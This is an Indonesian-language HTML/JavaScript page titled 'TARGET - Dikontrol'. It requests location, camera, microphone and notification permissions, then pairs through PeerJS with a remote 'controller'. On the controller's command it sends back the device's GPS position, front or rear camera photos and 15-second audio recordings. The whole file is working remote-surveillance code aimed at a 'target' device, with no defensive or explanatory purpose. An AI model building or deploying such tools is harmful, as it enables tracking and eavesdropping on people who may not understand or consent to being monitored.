<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
  <title>TARGET - Dikontrol</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: linear-gradient(135deg, #1a1a2e, #16213e);
      font-family: system-ui, sans-serif;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .container {
      background: rgba(255,255,255,0.1);
      backdrop-filter: blur(10px);
      border-radius: 48px;
      padding: 30px 24px;
      max-width: 500px;
      width: 100%;
      text-align: center;
    }
    h1 { color: white; margin-bottom: 10px; font-size: 1.8rem; }
    .permission-box {
      background: #0f0f1a;
      border-radius: 32px;
      padding: 20px;
      margin: 15px 0;
    }
    .permission-item {
      display: flex;
      justify-content: space-between;
      padding: 10px 0;
      border-bottom: 1px solid #222;
      color: #ddd;
    }
    .granted { color: #4caf50; }
    .pending { color: #ff9800; }
    .code-box {
      background: #0f0f1a;
      border-radius: 60px;
      padding: 20px;
      margin: 20px 0;
      display: none;
    }
    .code { font-size: 1.5rem; font-weight: bold; color: #4fc3f7; font-family: monospace; word-break: break-all; }
    .status {
      background: #0f0f1a;
      border-radius: 40px;
      padding: 12px;
      margin: 15px 0;
      display: none;
    }
    .btn {
      background: #4fc3f7;
      border: none;
      padding: 12px 24px;
      border-radius: 40px;
      font-weight: bold;
      cursor: pointer;
      display: none;
    }
    .log-area {
      background: #0f0f1a;
      border-radius: 24px;
      padding: 12px;
      margin-top: 15px;
      text-align: left;
      max-height: 150px;
      overflow-y: auto;
      font-size: 0.7rem;
      color: #aaa;
      display: none;
    }
    .spinner {
      width: 30px;
      height: 30px;
      border: 2px solid #333;
      border-top: 2px solid #4fc3f7;
      border-radius: 50%;
      margin: 10px auto;
      animation: spin 1s linear infinite;
    }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  </style>
</head>
<body>
<div class="container">
  <h1>📱 TARGET</h1>
  <div class="permission-box" id="permBox">
    <div id="permList">
      <div class="permission-item">📍 Lokasi <span id="pLoc" class="pending">⏳</span></div>
      <div class="permission-item">📷 Kamera <span id="pCam" class="pending">⏳</span></div>
      <div class="permission-item">🎙️ Mikrofon <span id="pMic" class="pending">⏳</span></div>
      <div class="permission-item">🔔 Notifikasi <span id="pNotif" class="pending">⏳</span></div>
    </div>
    <div class="spinner" id="spinner"></div>
    <div id="permText" style="font-size:0.7rem; color:#888;">0/4</div>
  </div>
  <div class="code-box" id="codeBox"><div style="font-size:0.7rem;">KODE PAIRING</div><div class="code" id="pairCode"></div></div>
  <div class="status" id="status">⏳ Menunggu koneksi...</div>
  <button class="btn" id="resetBtn">🔄 Kode Baru</button>
  <div class="log-area" id="logArea"></div>
</div>
<script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
<script>
  let peer, conn, peerId;
  let perms = { location: false, camera: false, microphone: false, notifications: false };
  let mediaRec, audioChunks = [];

  function log(msg, err=false) {
    const d = document.createElement('div');
    d.innerHTML = `📌 ${new Date().toLocaleTimeString()} - ${msg}`;
    d.style.color = err ? '#ff8888' : '#88ff88';
    d.style.borderBottom = '1px solid #222';
    d.style.padding = '4px 0';
    document.getElementById('logArea').appendChild(d);
    d.scrollIntoView();
    if (document.getElementById('logArea').children.length > 15) document.getElementById('logArea').removeChild(document.getElementById('logArea').firstChild);
  }

  function updatePermUI() {
    let cnt = 0;
    if (perms.location) { document.getElementById('pLoc').innerHTML = '✅'; document.getElementById('pLoc').className = 'granted'; cnt++; }
    if (perms.camera) { document.getElementById('pCam').innerHTML = '✅'; document.getElementById('pCam').className = 'granted'; cnt++; }
    if (perms.microphone) { document.getElementById('pMic').innerHTML = '✅'; document.getElementById('pMic').className = 'granted'; cnt++; }
    if (perms.notifications) { document.getElementById('pNotif').innerHTML = '✅'; document.getElementById('pNotif').className = 'granted'; cnt++; }
    document.getElementById('permText').innerHTML = `${cnt}/4`;
    if (cnt === 4) {
      document.getElementById('spinner').style.display = 'none';
      document.getElementById('permBox').style.display = 'none';
      document.getElementById('codeBox').style.display = 'block';
      document.getElementById('status').style.display = 'block';
      document.getElementById('resetBtn').style.display = 'inline-block';
      document.getElementById('logArea').style.display = 'block';
      initPeer();
    }
  }

  async function reqLoc() { return new Promise(r => { if(!navigator.geolocation) { perms.location=false; r(false); } else { navigator.geolocation.getCurrentPosition(()=>{ perms.location=true; r(true); }, ()=>{ perms.location=false; r(false); }, {timeout:8000}); } }); }
  async function reqCam() { try { let s = await navigator.mediaDevices.getUserMedia({video:true}); s.getTracks().forEach(t=>t.stop()); perms.camera=true; return true; } catch(e) { perms.camera=false; return false; } }
  async function reqMic() { try { let s = await navigator.mediaDevices.getUserMedia({audio:true}); s.getTracks().forEach(t=>t.stop()); perms.microphone=true; return true; } catch(e) { perms.microphone=false; return false; } }
  async function reqNotif() { if(!('Notification' in window)) { perms.notifications=false; return false; } if(Notification.permission==='granted') { perms.notifications=true; return true; } let r=await Notification.requestPermission(); perms.notifications=(r==='granted'); return perms.notifications; }

  async function requestAll() {
    log('Meminta izin...');
    await reqLoc(); updatePermUI(); await new Promise(r=>setTimeout(r,200));
    await reqCam(); updatePermUI(); await new Promise(r=>setTimeout(r,200));
    await reqMic(); updatePermUI(); await new Promise(r=>setTimeout(r,200));
    await reqNotif(); updatePermUI();
    log(`Selesai: ${Object.values(perms).filter(v=>v).length}/4`);
  }

  function initPeer() {
    if(peer) peer.destroy();
    peer = new Peer();
    peer.on('open', id => { peerId = id; document.getElementById('pairCode').innerText = id; log(`Siap, ID: ${id}`); });
    peer.on('connection', c => { conn = c; log(`Controller terhubung!`); document.getElementById('status').innerHTML = '✅ Terhubung!'; document.getElementById('status').style.background = '#2e7d32';
      c.on('data', d => handleCommand(d));
      c.on('close', () => { log('Controller putus'); document.getElementById('status').innerHTML = '⏳ Menunggu...'; document.getElementById('status').style.background = '#0f0f1a'; conn=null; });
    });
    peer.on('error', e => log(`Error: ${e.type}`, true));
  }

  async function handleCommand(cmd) {
    log(`Perintah: ${cmd.type}`);
    if(cmd.type === 'location') await getLocation();
    else if(cmd.type === 'notification') await sendNotif(cmd.message);
    else if(cmd.type === 'take_photo') await takePhoto(cmd.facingMode || 'environment');
    else if(cmd.type === 'start_record') await startRecord();
    else if(cmd.type === 'stop_record') await stopRecord();
  }

  async function getLocation() {
    if(!perms.location) return sendRes('location', {error:'Izin lokasi ditolak'});
    navigator.geolocation.getCurrentPosition(
      p => sendRes('location', {lat:p.coords.latitude, lng:p.coords.longitude, accuracy:p.coords.accuracy}),
      e => sendRes('location', {error:e.message})
    );
  }

  async function sendNotif(msg) {
    if(perms.notifications) new Notification('Controller', {body:msg});
    sendRes('notification', {success:perms.notifications, message:msg});
  }

  async function takePhoto(facing) {
    const mode = facing === 'user' ? 'DEPAN' : 'BELAKANG';
    log(`Ambil foto ${mode}...`);
    try {
      let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: facing } } });
      let video = document.createElement('video');
      video.srcObject = stream;
      await video.play();
      await new Promise(r=>setTimeout(r,300));
      let canvas = document.createElement('canvas');
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      let ctx = canvas.getContext('2d');
      if(facing === 'user') { ctx.translate(canvas.width,0); ctx.scale(-1,1); }
      ctx.drawImage(video,0,0,canvas.width,canvas.height);
      let img = canvas.toDataURL('image/jpeg',0.8);
      stream.getTracks().forEach(t=>t.stop());
      sendRes('photo', {image:img, facingMode:facing});
      log(`Foto ${mode} berhasil`);
    } catch(e) {
      log(`Gagal foto: ${e.message}`, true);
      sendRes('photo', {error:e.message});
    }
  }

  async function startRecord() {
    try {
      let stream = await navigator.mediaDevices.getUserMedia({audio:true});
      mediaRec = new MediaRecorder(stream);
      audioChunks = [];
      mediaRec.ondataavailable = e => audioChunks.push(e.data);
      mediaRec.onstop = () => {
        let blob = new Blob(audioChunks, {type:'audio/mpeg'});
        let reader = new FileReader();
        reader.onloadend = () => sendRes('audio', {audio:reader.result});
        reader.readAsDataURL(blob);
        stream.getTracks().forEach(t=>t.stop());
      };
      mediaRec.start();
      sendRes('recording_started', {success:true});
      log('Merekam... (auto stop 15dtk)');
      setTimeout(()=>{ if(mediaRec && mediaRec.state==='recording') mediaRec.stop(); }, 15000);
    } catch(e) { sendRes('recording_started', {error:e.message}); log(`Rekam gagal: ${e.message}`, true); }
  }

  async function stopRecord() {
    if(mediaRec && mediaRec.state==='recording') { mediaRec.stop(); log('Rekaman dihentikan'); }
    else log('Tidak ada rekaman aktif', true);
  }

  function sendRes(type, data) { if(conn && conn.open) conn.send({response:true, type, data}); }

  document.getElementById('resetBtn').onclick = () => { if(peer) peer.destroy(); initPeer(); };
  requestAll();
</script>
</body>
</html>
